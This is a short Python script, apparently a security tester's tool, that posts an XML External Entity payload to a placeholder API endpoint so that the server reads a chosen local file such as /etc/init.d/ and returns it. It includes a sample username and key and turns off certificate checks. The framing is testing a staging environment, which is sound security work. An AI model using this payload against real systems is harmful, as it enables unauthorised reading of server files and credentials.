"""
"""

import argparse
import re
import json
import sys
import requests


base_url = "https://vulnerable.api.example.com/v1.3/stuff"

http_proxy = "127.0.0.1:8080"
https_proxy = "127.0.0.1:8080"
proxyDict = {"http" : http_proxy, "https" : https_proxy}

def test_xxe(file_name):
    the_url = base_url 
    the_data = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE group [  
   <!ELEMENT group ANY ><!ENTITY name1 SYSTEM "%s" >]>
<credentials xmlns="http://docs.example.com/stuff/api/v1.3"
             username="hub_cap"
             key="a86850deb2742ec3cb41518e26aa2d89">&name1;</credentials>
    ''' % file_name
    headers={"Content-Type": "application/xml"}
    result  = requests.post(the_url, the_data, headers=headers, verify=False, proxies=proxyDict)
    #result  = requests.post(the_url, the_data, headers=headers, verify=False)
    try:
        print result.headers
        print result.text
        print result.json
    except Exception as e:
        print e

file_name = "/etc/init.d/"
if len(sys.argv) == 2:
    test_token = sys.argv[0]
    file_name = sys.argv[1]
else:
    print "Usage: testXXE-example.py  filename"
    print "  This script tests XXE vulneraiblity on the staging environment." 
    sys.exit()

#token = authenticate_user_pass()
test_xxe(file_name)

